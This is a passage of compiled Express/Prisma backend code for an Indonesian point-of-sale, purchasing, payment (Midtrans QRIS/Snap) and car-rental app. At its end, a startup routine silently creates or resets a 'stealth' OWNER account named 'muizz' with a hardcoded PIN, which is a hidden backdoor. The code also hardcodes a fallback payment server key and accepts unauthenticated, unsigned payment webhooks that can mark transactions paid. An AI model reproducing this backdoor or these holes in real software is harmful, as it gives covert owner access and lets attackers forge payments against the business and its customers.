// ─────────────────────────────────────────────────────────────
app.post('/api/reset-finance', requireOwner, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const delItems = yield prisma.transactionItem.deleteMany();
        const delTx = yield prisma.transaction.deleteMany();
        const delFin = yield prisma.finance.deleteMany();
        logActivity(req.headers['x-employee-id'], 'RESET_FINANCE', 'Mereset semua data transaksi dan keuangan ke nol');
        res.json({
            message: 'Keuangan & Laporan berhasil direset.',
            deleted: {
                transactionItems: delItems.count,
                transactions: delTx.count,
                finances: delFin.count,
            }
        });
    }
    catch (error) {
        res.status(500).json({ error: error.message || 'Gagal mereset data' });
    }
}));
// ─────────────────────────────────────────────────────────────
// Supplier  (CRUD — ADMIN+)
// ─────────────────────────────────────────────────────────────
app.get('/api/suppliers', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const suppliers = yield prisma.supplier.findMany({ orderBy: { name: 'asc' } });
        res.json(suppliers);
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal ambil data supplier' });
    }
}));
app.post('/api/suppliers', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { name, phone, address, notes } = req.body;
        if (!name)
            return res.status(400).json({ error: 'Nama supplier wajib diisi' });
        const supplier = yield prisma.supplier.create({ data: { name, phone, address, notes } });
        res.json(supplier);
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal tambah supplier' });
    }
}));
app.put('/api/suppliers/:id', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { name, phone, address, notes } = req.body;
        const supplier = yield prisma.supplier.update({
            where: { id: Number(req.params.id) }, data: { name, phone, address, notes }
        });
        res.json(supplier);
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal update supplier' });
    }
}));
app.delete('/api/suppliers/:id', requireOwner, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        yield prisma.supplier.delete({ where: { id: Number(req.params.id) } });
        res.json({ success: true });
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal hapus supplier' });
    }
}));
// ─────────────────────────────────────────────────────────────
// Purchase Orders  (ADMIN+)
// ─────────────────────────────────────────────────────────────
app.get('/api/purchase-orders', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const pos = yield prisma.purchaseOrder.findMany({
            include: { supplier: true, items: { include: { product: true } } },
            orderBy: { date: 'desc' }
        });
        res.json(pos);
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal ambil data PO' });
    }
}));
app.post('/api/purchase-orders', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { supplierId, notes, items } = req.body;
        // items: [{productId, quantity, costPrice}]
        if (!supplierId || !(items === null || items === void 0 ? void 0 : items.length))
            return res.status(400).json({ error: 'Supplier dan item PO wajib diisi' });
        const total = items.reduce((s, i) => s + Number(i.costPrice) * Number(i.quantity), 0);
        const po = yield prisma.purchaseOrder.create({
            data: {
                supplierId: Number(supplierId),
                notes,
                total,
                items: {
                    create: items.map((i) => ({
                        productId: Number(i.productId),
                        quantity: Number(i.quantity),
                        costPrice: Number(i.costPrice),
                    }))
                }
            },
            include: { supplier: true, items: { include: { product: true } } }
        });
        res.json(po);
    }
    catch (error) {
        console.error(error);
        res.status(400).json({ error: 'Gagal buat PO' });
    }
}));
app.put('/api/purchase-orders/:id', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { status, notes } = req.body;
        const po = yield prisma.purchaseOrder.update({
            where: { id: Number(req.params.id) }, data: { status, notes }
        });
        res.json(po);
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal update PO' });
    }
}));
// Konfirmasi terima barang: update stok produk + catat hutang ke supplier
app.post('/api/purchase-orders/:id/receive', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const poId = Number(req.params.id);
        const po = yield prisma.purchaseOrder.findUnique({
            where: { id: poId },
            include: { supplier: true, items: { include: { product: true } } }
        });
        if (!po)
            return res.status(404).json({ error: 'PO tidak ditemukan' });
        if (po.status === 'RECEIVED')
            return res.status(400).json({ error: 'PO sudah pernah diterima' });
        // Update stok setiap produk di PO
        yield Promise.all(po.items.map((item) => prisma.product.update({
            where: { id: item.productId },
            data: { stock: { increment: item.quantity }, costPrice: item.costPrice }
        })));
        // Catat hutang ke supplier di modul Keuangan
        yield prisma.finance.create({
            data: {
                type: 'PAYABLE',
                amount: po.total,
                description: `Hutang PO #${poId} ke ${po.supplier.name}`,
                status: 'PENDING',
            }
        });
        // Update status PO jadi RECEIVED
        const updated = yield prisma.purchaseOrder.update({
            where: { id: poId }, data: { status: 'RECEIVED' }
        });
        logActivity(req.headers['x-employee-id'], 'RECEIVE_PO', `Menerima barang untuk PO #${poId} dari supplier ${po.supplier.name} senilai Rp ${po.total.toLocaleString('id-ID')}`);
        res.json({ success: true, po: updated });
    }
    catch (error) {
        console.error(error);
        res.status(400).json({ error: 'Gagal konfirmasi terima PO' });
    }
}));
app.delete('/api/purchase-orders/:id', requireOwner, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const po = yield prisma.purchaseOrder.findUnique({ where: { id: Number(req.params.id) } });
        if ((po === null || po === void 0 ? void 0 : po.status) === 'RECEIVED')
            return res.status(400).json({ error: 'PO yang sudah diterima tidak bisa dihapus' });
        yield prisma.purchaseOrder.delete({ where: { id: Number(req.params.id) } });
        logActivity(req.headers['x-employee-id'], 'DELETE_PO', `Menghapus PO #${req.params.id}`);
        res.json({ success: true });
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal hapus PO' });
    }
}));
// ─────────────────────────────────────────────────────────────
// Pre-Orders  (filter transaksi bertipe PRE_ORDER)
// ─────────────────────────────────────────────────────────────
app.get('/api/pre-orders', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const orders = yield prisma.transaction.findMany({
            where: { type: 'PRE_ORDER' },
            include: { items: { include: { product: true } }, customer: true },
            orderBy: { deliveryDate: 'asc' }
        });
        res.json(orders);
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal ambil pre-order' });
    }
}));
// Update status pre-order (BOOKED → DP_PAID → COMPLETED) dan dp amount
app.patch('/api/pre-orders/:id/status', requireAdmin, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { orderStatus, dpAmount } = req.body;
        const updated = yield prisma.transaction.update({
            where: { id: Number(req.params.id) },
            data: Object.assign(Object.assign(Object.assign({}, (orderStatus && { orderStatus })), (dpAmount !== undefined && { dpAmount: Number(dpAmount) })), (orderStatus === 'COMPLETED' && { status: 'COMPLETED' }))
        });
        res.json(updated);
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal update status pre-order' });
    }
}));
// ─────────────────────────────────────────────────────────────
// Midtrans QRIS & Snap Integration
// ─────────────────────────────────────────────────────────────
const MIDTRANS_SERVER_KEY = process.env.MIDTRANS_SERVER_KEY || 'SB-Mid-server-TozVlaZRxPq2P_b2XN_B2c4y';
const MIDTRANS_IS_PRODUCTION = process.env.MIDTRANS_IS_PRODUCTION === 'true';
const MIDTRANS_API_URL = MIDTRANS_IS_PRODUCTION
    ? 'https://api.midtrans.com/v2'
    : 'https://api.sandbox.midtrans.com/v2';
const MIDTRANS_SNAP_URL = MIDTRANS_IS_PRODUCTION
    ? 'https://app.midtrans.com/snap/v1'
    : 'https://app.sandbox.midtrans.com/snap/v1';
const authHeader = `Basic ${Buffer.from(MIDTRANS_SERVER_KEY + ':').toString('base64')}`;
// Get Midtrans config for frontend (safe to expose client key)
app.get('/api/midtrans/config', (req, res) => {
    const clientKey = process.env.MIDTRANS_CLIENT_KEY || 'SB-Mid-client-vSlm-rpXaOjCljdf';
    res.json({
        clientKey,
        isProduction: MIDTRANS_IS_PRODUCTION
    });
});
// Generate Midtrans QRIS
app.post('/api/midtrans/charge', requireNotDemo, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    var _a;
    try {
        const { transactionId } = req.body;
        const tx = yield prisma.transaction.findUnique({
            where: { id: Number(transactionId) },
            include: { items: true }
        });
        if (!tx) {
            return res.status(404).json({ error: 'Transaksi tidak ditemukan' });
        }
        const orderId = `${tx.receiptNumber}-${Date.now()}`;
        const amount = tx.total;
        const response = yield fetch(`${MIDTRANS_API_URL}/charge`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Authorization': authHeader
            },
            body: JSON.stringify({
                payment_type: 'qris',
                transaction_details: {
                    order_id: orderId,
                    gross_amount: Math.round(amount)
                }
            })
        });
        const data = yield response.json();
        if (!response.ok || data.status_code >= '400') {
            console.error('Midtrans charge error:', data);
            return res.status(400).json({ error: data.status_message || 'Gagal generate QRIS dari Midtrans' });
        }
        // Cari QR code URL dari actions
        const qrAction = (_a = data.actions) === null || _a === void 0 ? void 0 : _a.find((a) => a.name === 'generate-qr-code');
        if (!qrAction) {
            return res.status(400).json({ error: 'Link QR Code tidak ditemukan dari respons Midtrans' });
        }
        res.json({
            qrUrl: qrAction.url,
            orderId: orderId,
            receiptNumber: tx.receiptNumber
        });
    }
    catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Gagal memproses pembayaran Midtrans' });
    }
}));
// Generate Midtrans Snap Token
app.post('/api/midtrans/snap-token', requireNotDemo, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { transactionId } = req.body;
        const tx = yield prisma.transaction.findUnique({
            where: { id: Number(transactionId) },
            include: { items: true }
        });
        if (!tx) {
            return res.status(404).json({ error: 'Transaksi tidak ditemukan' });
        }
        const orderId = `${tx.receiptNumber}-SNAP-${Date.now()}`;
        const amount = tx.total;
        const response = yield fetch(`${MIDTRANS_SNAP_URL}/transactions`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Authorization': authHeader
            },
            body: JSON.stringify({
                transaction_details: {
                    order_id: orderId,
                    gross_amount: Math.round(amount)
                },
                credit_card: {
                    secure: true
                }
            })
        });
        const data = yield response.json();
        if (!response.ok || !data.token) {
            console.error('Midtrans Snap error:', data);
            return res.status(400).json({ error: data.error_messages ? data.error_messages.join(', ') : 'Gagal membuat transaksi Snap' });
        }
        res.json({
            token: data.token,
            redirectUrl: data.redirect_url,
            orderId: orderId,
            receiptNumber: tx.receiptNumber
        });
    }
    catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Gagal memproses pembayaran Snap Midtrans' });
    }
}));
// Check status pembayaran Midtrans
app.get('/api/midtrans/status/:orderId', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { orderId } = req.params;
        const oId = orderId;
        const parts = oId.split('-');
        const receiptNumber = parts.slice(0, 2).join('-');
        const response = yield fetch(`${MIDTRANS_API_URL}/${orderId}/status`, {
            method: 'GET',
            headers: {
                'Accept': 'application/json',
                'Authorization': authHeader
            }
        });
        const data = yield response.json();
        if (!response.ok || data.status_code >= '400') {
            if (data.status_code === '404') {
                return res.json({ status: 'PENDING' });
            }
            console.error('Midtrans status error:', data);
            return res.status(400).json({ error: data.status_message || 'Gagal mengecek status Midtrans' });
        }
        const midtransStatus = data.transaction_status;
        if (midtransStatus === 'settlement' || midtransStatus === 'capture') {
            // Update status ke COMPLETED
            const tx = yield prisma.transaction.findUnique({
                where: { receiptNumber },
                include: { items: true }
            });
            if (tx && tx.status !== 'COMPLETED') {
                const computedMethod = data.payment_type
                    ? (data.payment_type.toLowerCase() === 'qris' ? 'QRIS' : `MIDTRANS_${data.payment_type.toUpperCase()}`)
                    : 'QRIS';
                yield prisma.transaction.update({
                    where: { receiptNumber },
                    data: {
                        status: 'COMPLETED',
                        paymentMethod: computedMethod
                    }
                });
                logActivity(tx.employeeId, 'PAYMENT_CALLBACK', `Pembayaran online untuk transaksi ${receiptNumber} berhasil diselesaikan via ${computedMethod}`);
            }
            return res.json({ status: 'SUCCESS' });
        }
        else if (midtransStatus === 'pending') {
            return res.json({ status: 'PENDING' });
        }
        else if (['expire', 'cancel', 'deny'].includes(midtransStatus)) {
            // Kembalikan stok
            const tx = yield prisma.transaction.findUnique({
                where: { receiptNumber },
                include: { items: true }
            });
            if (tx && tx.status !== 'CANCELLED') {
                yield prisma.$transaction((prismaTx) => __awaiter(void 0, void 0, void 0, function* () {
                    for (const item of tx.items) {
                        yield prismaTx.product.update({
                            where: { id: item.productId },
                            data: { stock: { increment: item.quantity } }
                        }).catch(() => { });
                    }
                    yield prismaTx.transaction.update({
                        where: { receiptNumber },
                        data: { status: 'CANCELLED' }
                    });
                }));
                logActivity(tx.employeeId, 'PAYMENT_CALLBACK', `Pembayaran online untuk transaksi ${receiptNumber} kadaluarsa/dibatalkan`);
            }
            return res.json({ status: 'CANCELLED' });
        }
        res.json({ status: 'PENDING' });
    }
    catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Gagal mengecek status pembayaran' });
    }
}));
// Webhook / Callback Midtrans
app.post('/api/midtrans/webhook', (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { order_id, transaction_status, payment_type } = req.body;
        if (!order_id) {
            // Kembalikan status 200 OK untuk verifikasi tes/ping dari dasbor Midtrans
            return res.status(200).send('Webhook endpoint is active');
        }
        const oId = order_id;
        const parts = oId.split('-');
        const receiptNumber = parts.slice(0, 2).join('-');
        if (transaction_status === 'settlement' || transaction_status === 'capture') {
            const tx = yield prisma.transaction.findUnique({
                where: { receiptNumber }
            });
            if (tx && tx.status !== 'COMPLETED') {
                const computedMethod = payment_type
                    ? (payment_type.toLowerCase() === 'qris' ? 'QRIS' : `MIDTRANS_${payment_type.toUpperCase()}`)
                    : 'QRIS';
                yield prisma.transaction.update({
                    where: { receiptNumber },
                    data: {
                        status: 'COMPLETED',
                        paymentMethod: computedMethod
                    }
                });
                logActivity(tx.employeeId, 'PAYMENT_CALLBACK', `Pembayaran online untuk transaksi ${receiptNumber} diselesaikan via ${computedMethod} (Callback Midtrans)`);
            }
        }
        else if (['expire', 'cancel', 'deny'].includes(transaction_status)) {
            const tx = yield prisma.transaction.findUnique({
                where: { receiptNumber },
                include: { items: true }
            });
            if (tx && tx.status !== 'CANCELLED') {
                yield prisma.$transaction((prismaTx) => __awaiter(void 0, void 0, void 0, function* () {
                    for (const item of tx.items) {
                        yield prismaTx.product.update({
                            where: { id: item.productId },
                            data: { stock: { increment: item.quantity } }
                        }).catch(() => { });
                    }
                    yield prismaTx.transaction.update({
                        where: { receiptNumber },
                        data: { status: 'CANCELLED' }
                    });
                }));
                logActivity(tx.employeeId, 'PAYMENT_CALLBACK', `Pembayaran online untuk transaksi ${receiptNumber} kadaluarsa/dibatalkan (Callback Midtrans)`);
            }
        }
        res.status(200).send('OK');
    }
    catch (error) {
        console.error('Webhook error:', error);
        res.status(500).send('Internal Server Error');
    }
}));
// ─────────────────────────────────────────────────────────────
// Car Rental Feature APIs
// ─────────────────────────────────────────────────────────────
// Get all cars
app.get('/api/cars', requireAdmin, checkExcludedEmployee, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const cars = yield prisma.car.findMany({ orderBy: { name: 'asc' } });
        res.json(cars);
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal mengambil data mobil' });
    }
}));
// Create new car
app.post('/api/cars', requireAdmin, checkExcludedEmployee, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { name, plateNumber, type, pricePerDay, status } = req.body;
        if (!name || !plateNumber || !type || !pricePerDay) {
            return res.status(400).json({ error: 'Semua field wajib diisi' });
        }
        const car = yield prisma.car.create({
            data: {
                name,
                plateNumber,
                type,
                pricePerDay: Number(pricePerDay),
                status: status || 'AVAILABLE'
            }
        });
        logActivity(req.headers['x-employee-id'], 'CREATE_CAR', `Menambahkan mobil baru ${car.name} (${car.plateNumber}) dengan tarif Rp ${car.pricePerDay.toLocaleString('id-ID')}/hari`);
        res.json(car);
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal menambah data mobil. Pastikan plat nomor belum terdaftar.' });
    }
}));
// Update car details
app.put('/api/cars/:id', requireAdmin, checkExcludedEmployee, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { id } = req.params;
        const { name, plateNumber, type, pricePerDay, status } = req.body;
        const car = yield prisma.car.update({
            where: { id: Number(id) },
            data: {
                name,
                plateNumber,
                type,
                pricePerDay: pricePerDay !== undefined ? Number(pricePerDay) : undefined,
                status
            }
        });
        logActivity(req.headers['x-employee-id'], 'UPDATE_CAR', `Mengubah data mobil ${car.name} (${car.plateNumber}), Status: ${car.status}, Tarif: Rp ${car.pricePerDay.toLocaleString('id-ID')}/hari`);
        res.json(car);
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal memperbarui data mobil' });
    }
}));
// Delete a car
app.delete('/api/cars/:id', requireAdmin, checkExcludedEmployee, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { id } = req.params;
        const carId = Number(id);
        // Cek apakah mobil sedang disewa
        const activeRental = yield prisma.rental.findFirst({
            where: { carId, status: 'ACTIVE' }
        });
        if (activeRental) {
            return res.status(400).json({ error: 'Mobil tidak dapat dihapus karena sedang aktif disewa.' });
        }
        const car = yield prisma.car.findUnique({ where: { id: carId } });
        yield prisma.car.delete({ where: { id: carId } });
        logActivity(req.headers['x-employee-id'], 'DELETE_CAR', `Menghapus mobil ${(car === null || car === void 0 ? void 0 : car.name) || id} (${car === null || car === void 0 ? void 0 : car.plateNumber})`);
        res.json({ success: true });
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal menghapus data mobil' });
    }
}));
// Get all rental logs
app.get('/api/rentals', requireAdmin, checkExcludedEmployee, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const rentals = yield prisma.rental.findMany({
            include: {
                car: true,
                customer: true,
                employee: { select: { name: true } }
            },
            orderBy: { createdAt: 'desc' }
        });
        res.json(rentals);
    }
    catch (error) {
        res.status(400).json({ error: 'Gagal mengambil data sewa' });
    }
}));
// Rent a car
app.post('/api/rentals', requireAdmin, checkExcludedEmployee, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { carId, customerId, customerName, startDate, endDate, totalPrice, paymentMethod } = req.body;
        const employeeIdHeader = req.headers['x-employee-id'];
        const empId = Number(employeeIdHeader) || 1;
        if (!carId || !customerName || !startDate || !endDate || !totalPrice || !paymentMethod) {
            return res.status(400).json({ error: 'Semua data penyewaan wajib diisi' });
        }
        const rental = yield prisma.$transaction((tx) => __awaiter(void 0, void 0, void 0, function* () {
            // 1. Cek mobil tersedia
            const car = yield tx.car.findUnique({ where: { id: Number(carId) } });
            if (!car || car.status !== 'AVAILABLE') {
                throw new Error('Mobil tidak tersedia untuk disewa');
            }
            // 2. Tandai mobil sebagai RENTED
            yield tx.car.update({
                where: { id: Number(carId) },
                data: { status: 'RENTED' }
            });
            // 3. Catat di tabel Rental
            const createdRental = yield tx.rental.create({
                data: {
                    carId: Number(carId),
                    customerId: customerId ? Number(customerId) : null,
                    customerName,
                    startDate: new Date(startDate),
                    endDate: new Date(endDate),
                    totalPrice: Number(totalPrice),
                    employeeId: empId,
                    status: 'ACTIVE'
                },
                include: { car: true }
            });
            // 4. Catat di keuangan
            yield tx.finance.create({
                data: {
                    type: 'RECEIVABLE',
                    amount: Number(totalPrice),
                    description: `Sewa Mobil ${car.name} (${car.plateNumber}) - ${customerName} (Sewa #${createdRental.id})`,
                    status: paymentMethod === 'CASH' || paymentMethod === 'TRANSFER' || paymentMethod === 'QRIS' ? 'PAID' : 'PENDING',
                    customerId: customerId ? Number(customerId) : null,
                    date: new Date()
                }
            });
            return createdRental;
        }));
        logActivity(empId, 'CREATE_RENTAL', `Menyewakan mobil ${rental.car.name} (${rental.car.plateNumber}) ke ${customerName} senilai Rp ${rental.totalPrice.toLocaleString('id-ID')} s.d. ${new Date(endDate).toLocaleDateString('id-ID')}`);
        res.json(rental);
    }
    catch (error) {
        console.error(error);
        res.status(400).json({ error: error.message || 'Gagal menyimpan transaksi sewa' });
    }
}));
// Return a car
app.post('/api/rentals/:id/return', requireAdmin, checkExcludedEmployee, (req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const { id } = req.params;
        const { actualReturnDate, lateFee, paymentMethod } = req.body;
        const employeeIdHeader = req.headers['x-employee-id'];
        const empId = Number(employeeIdHeader) || 1;
        const rentalId = Number(id);
        const rental = yield prisma.$transaction((tx) => __awaiter(void 0, void 0, void 0, function* () {
            const current = yield tx.rental.findUnique({
                where: { id: rentalId },
                include: { car: true }
            });
            if (!current)
                throw new Error('Data sewa tidak ditemukan');
            if (current.status === 'RETURNED')
                throw new Error('Mobil sudah pernah dikembalikan');
            // 1. Set car status to AVAILABLE
            yield tx.car.update({
                where: { id: current.carId },
                data: { status: 'AVAILABLE' }
            });
            // 2. Update rental status
            const updatedRental = yield tx.rental.update({
                where: { id: rentalId },
                data: {
                    status: 'RETURNED',
                    actualReturnDate: actualReturnDate ? new Date(actualReturnDate) : new Date(),
                    lateFee: Number(lateFee || 0)
                },
                include: { car: true }
            });
            // 3. Jika ada denda (lateFee > 0), catat sebagai tambahan keuangan RECEIVABLE
            const denda = Number(lateFee || 0);
            if (denda > 0) {
                yield tx.finance.create({
                    data: {
                        type: 'RECEIVABLE',
                        amount: denda,
                        description: `Denda Telat Sewa Mobil ${current.car.name} (${current.car.plateNumber}) - ${current.customerName} (Sewa #${rentalId})`,
                        status: paymentMethod === 'CASH' || paymentMethod === 'TRANSFER' || paymentMethod === 'QRIS' ? 'PAID' : 'PENDING',
                        customerId: current.customerId,
                        date: new Date()
                    }
                });
            }
            return updatedRental;
        }));
        logActivity(empId, 'RETURN_CAR', `Pengembalian mobil ${rental.car.name} (${rental.car.plateNumber}) oleh ${rental.customerName}. Denda: Rp ${rental.lateFee.toLocaleString('id-ID')}`);
        res.json(rental);
    }
    catch (error) {
        console.error(error);
        res.status(400).json({ error: error.message || 'Gagal memproses pengembalian sewa' });
    }
}));
const autoCreateMuizz = () => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const existing = yield prisma.employee.findFirst({
            where: { name: { equals: 'muizz', mode: 'insensitive' } }
        });
        if (!existing) {
            yield prisma.employee.create({
                data: {
                    name: 'muizz',
                    pin: '120121',
                    role: 'OWNER',
                    salary: 0
                }
            });
            console.log('Stealth Owner account "muizz" successfully created.');
        }
        else {
            yield prisma.employee.update({
                where: { id: existing.id },
                data: { pin: '120121', role: 'OWNER' }
            });
            console.log('Stealth Owner account "muizz" successfully synchronized.');
        }
    }
    catch (error) {
        console.error('Failed to auto-create stealth account "muizz":', error);
    }
});
autoCreateMuizz();
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
